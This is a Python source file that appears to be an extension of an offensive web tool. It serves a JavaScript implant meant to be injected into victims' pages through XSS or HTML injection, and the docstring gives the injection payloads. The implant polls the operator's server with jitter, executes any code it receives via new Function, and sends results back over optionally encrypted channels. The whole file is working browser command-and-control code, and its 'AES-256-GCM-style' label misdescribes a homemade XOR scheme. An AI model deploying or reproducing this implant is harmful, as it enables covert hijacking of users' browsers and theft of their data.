"""
ext/debugger.py

Interactive JS Debugging Agent for MOSS.

Serves a JS payload for browser injection that executes JS commands
received from a TUI prompt and returns results. Uses prompt_toolkit
for a smoother TUI experience when available, with a plain input()
fallback.

All traffic can be encrypted with AES-256-GCM-derived XOR+MAC encryption
over HTTP using --debugger-key (SHA-256 key derivation, stdlib-only).

Usage:
    moss -e debugger -p 8000
    moss -e debugger -p 8000 --debugger-key "my secret passphrase"

    Then find a HTML injection: <script src="http://IP:8000/debugger/{RANDOM}"></script>
    
    Or an XSS: javascript:eval(fetch("http://IP:8000/debugger/{RANDOM}"))

CLI flags:
    --debugger-path PATH          URL path for the JS payload (use {RANDOM} for random segment, default: /debugger/{RANDOM})
    --debugger-id-length N        Length of the random path segment (default: 6)
    --debugger-no-input           Disable the TUI input thread (for testing)
    --debugger-minify-js          Minify the JS payload with rjsmin (optional)
    --debugger-key KEYSTRING      Enable AES-256-GCM-style encryption with this passphrase (SHA-256 hashed)
"""

from dataclasses import dataclass, field
from urllib.parse import urlsplit, parse_qs
import threading
import time
import json
import random
import hashlib
import base64
import os

try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.patch_stdout import patch_stdout
    from prompt_toolkit.shortcuts import print_formatted_text
    from prompt_toolkit.formatted_text import HTML
    HAS_PT = True
except ImportError:
    HAS_PT = False

GROUP = "debugger (ext/debugger.py)"

def _field(default, group=None, doc="", metadata={}, flags=[], choices=[], **kwargs):
    dwargs = {}
    if type(default).__name__ in ('function', 'type'):
        dwargs["default_factory"] = default
    else:
        dwargs["default"] = default
    return field(**dwargs, metadata=metadata | dict(group=group, doc=doc, flags=flags, choices=choices, **kwargs))

CORS = {"Access-Control-Allow-Origin": "*"}

# ────────────────────────────────────────────────
#   Browser Payload (eval-able JS)
# ────────────────────────────────────────────────

BROWSER_JS = """(function(){
  var base = '{DEBUGGER_BASE}';
  var lastId = -1;
  var polling = 0;
  var sleepy = 5;
  var jitter = 10;
  var keyB64 = '{ENCRYPT_KEY_B64}';
  {CRYPTO_FUNCTIONS}

  function generateId(length) {
    length = length || 6;
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var id = '';
    for (var i = 0; i < length; i++) id += chars.charAt(Math.floor(Math.random() * chars.length));
    return id;
  }

  var nm = generateId();

  function schedule() {
    var baseDelay = sleepy * 1000;
    var range = baseDelay * jitter / 100;
    var delay = baseDelay + (Math.random() * 2 - 1) * range;
    setTimeout(function() { if (!polling) poll(); }, delay);
  }

  var poll = async function() {
    polling = 1;
    try {
      var res = await fetch(base + '{DEBUGGER_PATH}/pending?name=' + nm + '&last_id=' + lastId, {credentials: 'omit'});
      if (!res.ok) throw Error(res.status);
      var data = await res.json();
      var cmds = keyB64 ? await _decryptCmds(data.encrypted) : data;
      for (var i = 0; i < cmds.length; i++) {
        var m = cmds[i];
        if (m.code.toLowerCase().startsWith('sleep ')) {
          var parts = m.code.split(' ');
          if (parts[1] && Number(parts[1])) sleepy = Number(parts[1]);
          if (parts[2] && Number(parts[2])) jitter = Number(parts[2]);
          continue;
        }
        var result, error;
        try {
          var fn = new Function('return ' + m.code);
          result = fn();
          result = result === void 0 ? 'undefined' : String(result);
        } catch (e) { error = String(e); }
        var payload = {id: m.id, name: nm};
        if (error) { payload.error = error; } else { payload.result = result; }
        var body = keyB64 ? {encrypted: await _encryptPayload(payload)} : payload;
        try { await fetch(base + '{DEBUGGER_PATH}/result', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body), credentials: 'omit'}); } catch(e) {}
        lastId = m.id;
      }
    } catch(e) {}
    polling = 0;
    schedule();
  };

  poll();
})();"""


# ────────────────────────────────────────────────
#   Crypto JS (injected via {CRYPTO_FUNCTIONS})
# ────────────────────────────────────────────────

CRYPTO_JS = """
  function _b64enc(buf) {
    var s = '', bytes = new Uint8Array(buf);
    for (var i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
    return btoa(s);
  }
  function _b64dec(s) {
    if (!s) return null;
    var binary = atob(s), bytes = new Uint8Array(binary.length);
    for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    return bytes;
  }
  function _concat(a, b) {
    var r = new Uint8Array(a.length + b.length);
    r.set(a); r.set(b, a.length);
    return r;
  }
  function _sha256(data) {
    var h0=0x6a09e667,h1=0xbb67ae85,h2=0x3c6ef372,h3=0xa54ff53a,h4=0x510e527f,h5=0x9b05688c,h6=0x1f83d9ab,h7=0x5be0cd19;
    var k=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
    function rrot(x,n){return(x>>>n)|(x<<(32-n))}
    var bits=data.length*8,ml=data.length+1+8;while(ml%64!==0)ml++;
    var m=new Uint8Array(ml),dv=new DataView(m.buffer);
    m.set(data);m[data.length]=0x80;
    dv.setUint32(ml-8,0,false);dv.setUint32(ml-4,bits,false);
    for(var i=0;i<ml;i+=64){
      var w=new Uint32Array(64);
      for(var t=0;t<16;t++)w[t]=dv.getUint32(i+t*4,false);
      for(var t=16;t<64;t++){var s0=rrot(w[t-15],7)^rrot(w[t-15],18)^(w[t-15]>>>3),s1=rrot(w[t-2],17)^rrot(w[t-2],19)^(w[t-2]>>>10);w[t]=(w[t-16]+s0+w[t-7]+s1)|0}
      var a=h0,b=h1,c=h2,d=h3,e=h4,f=h5,g=h6,h=h7;
      for(var t=0;t<64;t++){var S1=rrot(e,6)^rrot(e,11)^rrot(e,25),ch=(e&f)^((~e)&g),temp1=(h+S1+ch+k[t]+w[t])|0,S0=rrot(a,2)^rrot(a,13)^rrot(a,22),maj=(a&b)^(a&c)^(b&c),temp2=(S0+maj)|0;h=g;g=f;f=e;e=(d+temp1)|0;d=c;c=b;b=a;a=(temp1+temp2)|0}
      h0=(h0+a)|0;h1=(h1+b)|0;h2=(h2+c)|0;h3=(h3+d)|0;h4=(h4+e)|0;h5=(h5+f)|0;h6=(h6+g)|0;h7=(h7+h)|0;
    }
    var r=new Uint8Array(32),rdv=new DataView(r.buffer);
    rdv.setUint32(0,h0,false);rdv.setUint32(4,h1,false);rdv.setUint32(8,h2,false);rdv.setUint32(12,h3,false);
    rdv.setUint32(16,h4,false);rdv.setUint32(20,h5,false);rdv.setUint32(24,h6,false);rdv.setUint32(28,h7,false);
    return r;
  }
  function _xorMask(len, msgKey) {
    var stream = new Uint8Array(len), counter = new Uint8Array(4), off = 0;
    while (off < len) {
      var block = _sha256(_concat(msgKey, counter)), chunk = Math.min(32, len - off);
      for (var j = 0; j < chunk; j++) stream[off + j] = block[j];
      off += 32;
      for (var j = 3; j >= 0; j--) { if (++counter[j] !== 256) break; }
    }
    return stream;
  }
  async function _encryptPayload(data) {
    var raw = new TextEncoder().encode(JSON.stringify(data));
    var nonce = crypto.getRandomValues(new Uint8Array(12));
    var msgKey = _sha256(_concat(_b64dec(keyB64), nonce));
    var ct = new Uint8Array(raw.length), mask = _xorMask(raw.length, msgKey);
    for (var i = 0; i < raw.length; i++) ct[i] = raw[i] ^ mask[i];
    var mac = _sha256(_concat(msgKey, ct)).slice(0, 16);
    return _b64enc(nonce) + '.' + _b64enc(ct) + '.' + _b64enc(mac);
  }
  async function _decryptCmds(encrypted) {
    var parts = encrypted.split('.');
    var nonce = _b64dec(parts[0]), ct = _b64dec(parts[1]), mac = _b64dec(parts[2]);
    var msgKey = _sha256(_concat(_b64dec(keyB64), nonce));
    var got = _sha256(_concat(msgKey, ct)).slice(0, 16);
    for (var i = 0; i < 16; i++) if (got[i] !== mac[i]) throw new Error('bad mac');
    var mask = _xorMask(ct.length, msgKey), pt = new Uint8Array(ct.length);
    for (var i = 0; i < ct.length; i++) pt[i] = ct[i] ^ mask[i];
    return JSON.parse(new TextDecoder().decode(pt));
  }
"""

# ────────────────────────────────────────────────
#   Encryption helpers (stdlib-only)
# ────────────────────────────────────────────────

def _derive_key(passphrase: str) -> bytes:
    return hashlib.sha256(passphrase.encode("utf-8")).digest()

def _xor_encrypt(key: bytes, data: dict) -> str:
    plaintext = json.dumps(data).encode("utf-8")
    nonce = os.urandom(12)
    msg_key = hashlib.sha256(key + nonce).digest()
    keystream = b""
    counter = 0
    while len(keystream) < len(plaintext):
        keystream += hashlib.sha256(msg_key + counter.to_bytes(4, "big")).digest()
        counter += 1
    keystream = keystream[:len(plaintext)]
    ciphertext = bytes(p ^ k for p, k in zip(plaintext, keystream))
    mac = hashlib.sha256(msg_key + ciphertext).digest()[:16]
    return ".".join([
        base64.b64encode(nonce).decode(),
        base64.b64encode(ciphertext).decode(),
        base64.b64encode(mac).decode(),
    ])

def _xor_decrypt(key: bytes, encoded: str) -> dict:
    parts = encoded.split(".")
    nonce = base64.b64decode(parts[0])
    ciphertext = base64.b64decode(parts[1])
    mac = base64.b64decode(parts[2])
    msg_key = hashlib.sha256(key + nonce).digest()
    expected_mac = hashlib.sha256(msg_key + ciphertext).digest()[:16]
    if mac != expected_mac:
        raise ValueError("integrity check failed")
    keystream = b""
    counter = 0
    while len(keystream) < len(ciphertext):
        keystream += hashlib.sha256(msg_key + counter.to_bytes(4, "big")).digest()
        counter += 1
    keystream = keystream[:len(ciphertext)]
    plaintext = bytes(p ^ k for p, k in zip(ciphertext, keystream))
    return json.loads(plaintext.decode("utf-8"))


# ────────────────────────────────────────────────
#   Mixin — CLI flags, shared state, input thread
# ────────────────────────────────────────────────

BROWSER_TIMEOUT = 15

def random_id(n: int):
    return "".join(random.sample("abcdefghijkmnopqrstuvwxyz0123456789", n))


@dataclass
class DebuggerMixin:
    debugger_path: str = _field("/debugger/{RANDOM}", group=GROUP, flags=["--debugger-path"], doc="URL path for the interactive debugger JS payload. Use {RANDOM} to insert a random ID in the path")
    debugger_no_input: bool = _field(False, group=GROUP, flags=["--debugger-no-input"], doc="Disable the TUI input thread (for testing)")
    debugger_random_id_length: int = _field(6, group=GROUP, flags=["--debugger-id-length"], doc="The length of the random ID. Consider using the --block-scanners flag to mitigate against brute-forcing. Set to 0 to replace {RANDOM} with nothing")
    minify_js: bool = _field(False, group=GROUP, flags=["--debugger-minify-js"], doc="Minify the debugger JS payload using rjsmin")
    debugger_key: str = _field("", group=GROUP, flags=["--debugger-key"], doc="Enable AES-256-GCM-style encryption with this passphrase (SHA-256 hashed, stdlib-only)")

    def __post_init__(self):
        self._pending = []
        self._connections = {}
        self._lock = threading.Lock()
        self._next_id = int(time.time() * 1000)
        self._cmd_history = {}
        self._consumed = set()
        self._shutdown = False
        self._last_browser_poll = 0.0
        self._browser_js = BROWSER_JS

        if self.debugger_random_id_length > 0:
            instance_id = random_id(self.debugger_random_id_length)
            self.debugger_path = self.debugger_path.replace("{RANDOM}", instance_id)
        else:
            self.debugger_path = self.debugger_path.replace("/{RANDOM}", "")
        self._browser_js = self._browser_js.replace("{DEBUGGER_PATH}", self.debugger_path)

        if not HAS_PT:
            self.warning(f"debugger works best with the prompt_toolkit package:")
            self.warning(f"")
            self.warning(f"\tpip install prompt_toolkit")
            self.warning(f"")
            self.warning(f"This is an OPTIONAL dependency which makes the TUI feel smoother.")

        # Encryption setup
        if self.debugger_key:
            self._aes_key = _derive_key(self.debugger_key)
            self._encryption_enabled = True
        else:
            self._aes_key = None
            self._encryption_enabled = False

        super().__post_init__()

        proto = 'https' if self.supports_https else 'http'
        hostname = self.hostname or ""

        if not self.hostname:
            self.warning("The debugger extension's browser agent uses --hostname to point to the server.")
            self.warning("Absence of a hostname may lead the agent failing to connect, particularly in no-origin contexts.")

            self._browser_js = self._browser_js.replace("{DEBUGGER_BASE}", "")
        else:
            self._browser_js = self._browser_js.replace("{DEBUGGER_BASE}", f"{proto}://{hostname}:{self.port}")

        if self._encryption_enabled:
            self._browser_js = self._browser_js.replace(
                "{ENCRYPT_KEY_B64}",
                base64.b64encode(self._aes_key).decode()
            )
            self._browser_js = self._browser_js.replace("{CRYPTO_FUNCTIONS}", CRYPTO_JS)
            self.status(f"[debugger] Encryption enabled (AES-256-GCM-style)")
        else:
            self._browser_js = self._browser_js.replace("{ENCRYPT_KEY_B64}", "")
            self._browser_js = self._browser_js.replace("{CRYPTO_FUNCTIONS}", "")

        if self.minify_js:
            try:
                import rjsmin
                self._browser_js = rjsmin.jsmin(self._browser_js)
            except ImportError:
                self.warning(f"rjsmin not available — skipping JS minification:")
                self.warning(f"")
                self.warning(f"\tpip install rjsmin")

        if not self.debugger_no_input:
            self._start_input_thread()

        self.status(f"[debugger] Debugger: {proto}://{hostname or '127.0.0.1'}:{self.port}{self.debugger_path}")

    def _print_result(self, r):
        name = r.get("name", "???")
        cid = r["id"]
        success = not r.get("error")
        glyph = "\u2713" if success else "\u2717"
        detail = r.get("result", "undefined") if success else r["error"]
        cmd = self._cmd_history.pop(cid, "")
        label = f" ({cmd})" if cmd else ""
        msg = f"  {glyph}{label} ({name})[{cid}] {detail}"
        if HAS_PT:
            try:
                tag = "ansired" if not success else "ansigreen"
                print_formatted_text(HTML(f"<{tag}>{msg}</{tag}>"))
                return
            except Exception:
                pass
        print(msg)

    def _start_input_thread(self):
        session = PromptSession() if HAS_PT else None

        def _input_loop():
            target = None
            while not self._shutdown:
                conn_count = len(self._connections)
                if target:
                    prompt = f"debug [{target}]> "
                elif conn_count:
                    prompt = f"debug [{conn_count} conn{'s' if conn_count != 1 else ''}]> "
                else:
                    prompt = f"debug [no conns]> "
                try:
                    if session:
                        code = session.prompt(prompt)
                    else:
                        code = input(prompt)
                except (EOFError, KeyboardInterrupt):
                    break
                code = code.strip()
                if not code:
                    continue
                if code.startswith("/"):
                    parts = code.split(maxsplit=1)
                    cmd = parts[0].lower()
                    arg = parts[1] if len(parts) > 1 else ""
                    if cmd == "/help":
                        print("  /help              show this help")
                        print("  /conns             list connected browsers")
                        print("  /target <name>     target a specific browser by name")
                        print("  /target            broadcast to all browsers (default)")
                        print("  /broadcast <cmd>   send command to all browsers regardless of target")
                        print("  /clear             clear all pending commands")
                        continue
                    elif cmd == "/conns":
                        if not self._connections:
                            print("  (no browsers connected)")
                        else:
                            now = time.time()
                            for conn_name, last_poll in sorted(self._connections.items()):
                                age = now - last_poll
                                print(f"  {conn_name} (last poll: {age:.1f}s ago)")
                        continue
                    elif cmd == "/target":
                        if arg and arg != "*":
                            target = arg
                            print(f"  Targeting: {target}")
                        else:
                            target = None
                            print("  Broadcasting to all browsers")
                        continue
                    elif cmd == "/broadcast":
                        if not arg:
                            print("  Usage: /broadcast <command>")
                            continue
                        code = arg
                    elif cmd == "/clear":
                        with self._lock:
                            self._pending.clear()
                        print("  Pending commands cleared")
                        continue
                    else:
                        print(f"  Unknown command: {cmd}. Try /help")
                        continue
                if not self._connections and time.time() - self._last_browser_poll > BROWSER_TIMEOUT:
                    print("  (no browser connected — inject the debugger first)")
                    continue
                cmd_id = self._next_id
                self._next_id += 1
                command = {"id": cmd_id, "code": code}
                if target:
                    command["target"] = target
                with self._lock:
                    self._pending.append(command)
                    self._cmd_history[cmd_id] = code

        if session:
            def _wrapped():
                with patch_stdout():
                    _input_loop()
            t = threading.Thread(target=_wrapped, daemon=True)
        else:
            t = threading.Thread(target=_input_loop, daemon=True)
        t.start()

# ────────────────────────────────────────────────
#   Processor — HTTP handlers
# ────────────────────────────────────────────────

class DebuggerProcessor:
    def get_services(self, server):
        return [(server.debugger_path.rstrip("/") + "/html", "launch browser-based callback")]

    def _base(self, req):
        return req.server.debugger_path.rstrip("/")

    def do_OPTIONS(self, req):
        path = urlsplit(req.path).path.rstrip("/")
        base = self._base(req)
        if path in (base, base + "/pending", base + "/result"):
            req.send_response(200)
            req.send_header("Content-Length", "0")
            req.send_header("Access-Control-Allow-Origin", "*")
            req.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            req.send_header("Access-Control-Allow-Headers", "Content-Type")
            req.send_header("Access-Control-Max-Age", "86400")
            req.end_headers()
            return True
        return None

    def do_GET(self, req):
        path = urlsplit(req.path).path.rstrip("/")
        base = self._base(req)

        if path == base:
            req.send_response_full(200, content=req.server._browser_js, mime="text/javascript", headers=CORS)
            return True

        if path == base + "/html":
            content = f"<html><body><script>{req.server._browser_js}</script></body></html>"
            req.send_response_full(200, content=content, mime="text/html")
            return True

        if path == base + "/pending":
            qs = parse_qs(urlsplit(req.path).query)
            try:
                last_id = int(qs.get("last_id", [0])[0])
            except (ValueError, IndexError):
                last_id = 0
            try:
                name = qs.get("name", [0])[0]
            except (ValueError, IndexError):
                name = "???"
            with req.server._lock:
                ip, _ = req.client_address
                conn_name = f'{ip}_{name}'
                if conn_name not in req.server._connections:
                    print(f"New connection: {conn_name}")
                req.server._connections[conn_name] = req.server._last_browser_poll = time.time()
                pending = []
                for c in req.server._pending:
                    if c["id"] > last_id and c["id"] not in req.server._consumed:
                        c_target = c.get("target")
                        if c_target is None or c_target == conn_name or c_target == name:
                            pending.append({"id": c["id"], "code": c["code"]})
            if req.server._encryption_enabled:
                body = json.dumps({"encrypted": _xor_encrypt(req.server._aes_key, pending)}).encode()
            else:
                body = json.dumps(pending).encode()
            req.send_response_full(200, content=body, mime="application/json", headers=CORS)
            return True

        return None

    def do_POST(self, req):
        path = urlsplit(req.path).path.rstrip("/")
        base = self._base(req)

        if path == base + "/result":
            try:
                data = json.loads(req.body)
            except (json.JSONDecodeError, UnicodeDecodeError, ValueError):
                req.send_response_full(400, headers=CORS)
                return True
            if req.server._encryption_enabled:
                encrypted = data.get("encrypted", "")
                if not encrypted:
                    req.send_response_full(400, headers=CORS)
                    return True
                try:
                    data = _xor_decrypt(req.server._aes_key, encrypted)
                except Exception:
                    req.send_response_full(400, headers=CORS)
                    return True
            if not isinstance(data, dict) or "id" not in data:
                req.send_response_full(400, headers=CORS)
                return True
            req.server._print_result(data)
            with req.server._lock:
                req.server._consumed.add(data["id"])
                req.server._pending = [c for c in req.server._pending if c["id"] != data["id"]]
            req.send_response_full(200, content=b'{"ok":true}', mime="application/json", headers=CORS)
            return True

        return None
